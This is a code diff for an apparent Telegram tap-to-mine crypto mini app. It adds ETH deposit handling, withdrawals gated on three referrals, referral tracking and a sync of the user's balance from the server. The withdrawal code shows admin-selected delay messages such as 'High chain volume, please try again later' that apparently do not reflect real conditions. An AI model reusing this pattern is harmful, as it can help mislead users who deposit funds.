@@ -1215,7 +1381,22 @@ function showElig(have, need) {
 
 function openWd() {
   const needRefs = 3, haveRefs = state.refTotal || 0;
-  showElig(haveRefs, needRefs);
+  if (haveRefs < needRefs) {
+    showElig(haveRefs, needRefs);
+    return;
+  }
+  if (state.withdrawMode === "starts_on") {
+    toast(`Withdrawals will start on ${state.withdrawDate}! Keep mining.`);
+    return;
+  }
+  if (state.withdrawMode === "started_today") {
+    toast("Withdrawal started today! High chain volume, please try again later.");
+    return;
+  }
+
+  document.getElementById("wa").value = "";
+  document.getElementById("ww").value = state.userWallet || "";
+  op("m-w");
 }
 
 function confirmWithdrawAction() {
@@ -1257,6 +1438,7 @@ function addNewAdmin() {
   }
 }
 
+// Tab Switching
 function switchView(tabId) {
   document.querySelectorAll(".view").forEach(v => v.classList.remove("on"));
   document.querySelectorAll("nav button").forEach(b => b.classList.remove("on"));
@@ -1266,6 +1448,13 @@ function switchView(tabId) {
 
   const targetBtn = document.querySelector(`nav button[data-t="${tabId}"]`);
   if (targetBtn) targetBtn.classList.add("on");
+
+  // Instant refresh jab bhi Refer tab par tap ho
+  checkDailyRewardStatus();
+  if (tabId === "ref") {
+    loadReferralStats();
+    if (typeof fetchUserFromVPS === "function") fetchUserFromVPS();
+  }
 }
 
 document.querySelectorAll("nav button").forEach(btn => {
@@ -1274,6 +1463,7 @@ document.querySelectorAll("nav button").forEach(btn => {
   });
 });
 
+// Modals
 function op(id) { document.getElementById(id).classList.add("on"); }
 function cl(id) { document.getElementById(id).classList.remove("on"); }
 
@@ -1282,15 +1472,39 @@ function openDaily() { renderDaily(); op("m-d"); }
 function openDeposit() {
   cl("m-p");
   op("m-dep");
-  const on = !!state.depositOn;
-  const show = (id, visible) => { document.getElementById(id).style.display = visible ? "" : "none"; };
-  show("depHint", on);
-  show("depQrBox", on);
-  show("depAddrText", on);
-  show("depCopyBtn", on);
-  const off = document.getElementById("depOffBox");
-  off.style.display = on ? "none" : "block";
-  off.innerText = state.depositOffMsg || "Deposits are temporarily unavailable. Please try again later.";
+  const isDepositActive = (state.depositOn === true || state.depositOn === "on" || state.depositOn === 1);
+  const container = document.querySelector("#m-dep .sh");
+  if (!container) return;
+
+  if (!isDepositActive) {
+    container.innerHTML = `
+      <div class="mh" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;">
+        <h3 style="margin:0 auto 0 0;font-size:20px;font-weight:800;">ETH Deposit</h3>
+        <button class="x" onclick="cl('m-dep')"><svg width="20" height="20"><use href="#xc"/></svg></button>
+      </div>
+      <div style="padding:32px 18px;margin:20px 0;border-radius:22px;border:1.5px solid rgba(245,166,35,0.4);background:rgba(245,166,35,0.06);text-align:center;box-shadow:0 0 25px rgba(245,166,35,0.15);">
+        <div style="font-size:38px;margin-bottom:12px;">⚠️</div>
+        <div style="font-size:20px;font-weight:800;color:#f5a623;margin-bottom:10px;">Deposit Paused</div>
+        <div style="font-size:15px;line-height:1.55;color:#cfd3e6;font-weight:500;">${state.depositOffMsg || "Deposits are temporarily unavailable. Please try again later."}</div>
+      </div>
+    `;
+  } else {
+    const qrSrc = state.depositAddress ? `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(state.depositAddress)}` : "";
+    container.innerHTML = `
+      <div class="mh" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;">
+        <h3 style="margin:0 auto 0 0;font-size:20px;font-weight:800;">ETH Deposit</h3>
+        <button class="x" onclick="cl('m-dep')"><svg width="20" height="20"><use href="#xc"/></svg></button>
+      </div>
+      <p style="font-size:12px;color:var(--mut);margin-bottom:10px;text-align:center;">Send only ETH (Ethereum network) to this deposit address.</p>
+      <div class="qr-box" style="background:#fff;padding:12px;border-radius:18px;width:180px;height:180px;margin:12px auto;display:flex;align-items:center;justify-content:center;">
+        <img src="${qrSrc}" alt="QR" style="width:100%;height:100%;object-fit:contain;">
+      </div>
+      <div style="font-size:11px;font-family:monospace;background:#050912;padding:12px;border-radius:12px;word-break:break-all;color:var(--cy);margin-bottom:14px;text-align:center;">
+        ${state.depositAddress || "The admin has not set a ETH deposit address yet."}
+      </div>
+      <button class="cb" onclick="copyDepositAddress()">Copy Address</button>
+    `;
+  }
 }
 function openH() { cl("m-p"); op("m-h"); }
 
@@ -1308,11 +1522,13 @@ function saveW() {
     toast("Invalid address. Please enter a valid Ethereum (0x) address.");
     return;
   }
-  state.userWallet = a;
-  saveLocalState();
-  syncUserWithCloudflare();
-  cl("m-c");
-  toast(`${state.selectedWalletBrand} connected!`);
+  {
+    state.userWallet = a;
+    saveLocalState();
+    syncUserWithCloudflare();
+    cl("m-c");
+    toast(`${state.selectedWalletBrand} connected!`);
+  }
 }
 
 function copyDepositAddress() {
@@ -1335,6 +1551,7 @@ function shareRef() {
   }
 }
 
+// Background Starfield
 (function initStars() {
   const cvs = document.getElementById("stars");
   const ctx = cvs.getContext("2d");
@@ -1365,31 +1582,41 @@ function shareRef() {
   draw();
 })();
 
+// Referral: read ref from direct mini app link (startapp=ref_<id>)
+// Robust Start Param extractor
 function getStartParam() {
   try {
     const tg = window.Telegram && window.Telegram.WebApp;
-    return (tg && tg.initDataUnsafe && tg.initDataUnsafe.start_param) || "";
-  } catch(e){ return ""; }
+    if (tg && tg.initDataUnsafe && tg.initDataUnsafe.start_param) {
+      return String(tg.initDataUnsafe.start_param);
+    }
+  } catch(e){}
+  try {
+    const urlParams = new URLSearchParams(window.location.search);
+    const sp = urlParams.get('startapp') || urlParams.get('tgWebAppStartParam') || urlParams.get('start_param');
+    if (sp) return String(sp);
+  } catch(e){}
+  return "";
 }
+
 async function registerReferral() {
   const sp = getStartParam();
-  if (!sp.startsWith("ref_")) return;
-  const referrerId = sp.slice(4);
-  if (!referrerId || referrerId === currentTgId) return;
-  const key = "meteora_ref_sent_" + currentTgId;
-  try { if (localStorage.getItem(key)) return; } catch(e){}
+  if (!sp) return;
+  const refId = sp.replace(/^ref_/, '').trim();
+  if (!refId || refId === String(currentTgId)) return;
+
   try {
-    const res = await fetch(`${CLOUDFLARE_API}/api/referral/register`, {
+    await fetch('/api/referral/register', {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ newUserId: currentTgId, referrerId })
+      body: JSON.stringify({ newUserId: currentTgId, referrerId: refId })
     });
-    if (res.ok) { try { localStorage.setItem(key, "1"); } catch(e){} }
   } catch(e){}
 }
+
 async function loadReferralStats() {
   try {
-    const res = await fetch(`${CLOUDFLARE_API}/api/referral/stats?tgId=${encodeURIComponent(currentTgId)}`);
+    const res = await fetch(`/api/referral/stats?tgId=${encodeURIComponent(currentTgId)}`);
     if (!res.ok) return;
     const d = await res.json();
     state.refTotal = d.total || 0;
@@ -1400,6 +1627,8 @@ async function loadReferralStats() {
   } catch(e){}
 }
 
+
+// ---- Languages ----
 const I18N = {
   en: { nav_refer:"Refer", nav_task:"Task", nav_tap:"Tap", nav_wallet:"Wallet", daily:"Daily Rewards", tap_mine:"Tap to mine", ready:"Ready",
         total_balance:"TOTAL BALANCE", tasks:"TASKS", wallet:"WALLET", refer_title:"Refer & Earn", refer_sub:"Invite friends and earn more Space ID",
@@ -1445,6 +1674,7 @@ function applyLang(code) {
   render(); renderTasks(); renderDaily(); refreshTimer();
 }
 
+// Start App & Sync
 document.getElementById("referBonusText").innerText = REFER_BONUS;
 if (Array.isArray(state.tasks) && state.tasks.length) TASKS_DATA = state.tasks;
 renderAdminTasks();
@@ -1455,12 +1685,45 @@ renderDaily();
 refreshTimer();
 setTimeout(() => document.getElementById("splash").classList.add("off"), 1000);
 applyLang(localStorage.getItem("meteora_lang") || "en");
+
+async function fetchUserFromVPS() {
+  try {
+    const res = await fetch(`/api/user?tgId=${encodeURIComponent(currentTgId)}`);
+    if (res.ok) {
+      const d = await res.json();
+      if (d && d.balance !== undefined && d.balance !== null) {
+        if (Number(d.balance) > state.bal) {
+          state.bal = parseFloat(d.balance);
+        }
+        if (d.eth !== undefined) state.eth = parseFloat(d.eth);
+        if (d.wallet) state.userWallet = d.wallet;
+        if (d.cooldownEnd && d.cooldownEnd > Date.now()) {
+          state.cooldownEnd = d.cooldownEnd;
+        }
+        saveLocalState();
+      }
+    }
+  } catch(e) {}
+}
+
 loadCloudflareSettings();
+fetchUserFromVPS();
 syncUserWithCloudflare();
 pullCloud();
 registerReferral();
 loadReferralStats();
 setInterval(loadReferralStats, 60000);
+
+// Direct Touch Vibration Listener for mobile screens
+document.addEventListener("DOMContentLoaded", () => {
+  const coinEl = document.getElementById("coin");
+  if (coinEl) {
+    coinEl.addEventListener("touchstart", () => {
+      triggerVibration();
+    }, { passive: true });
+  }
+});
+
 </script>
 </body>
 </html>
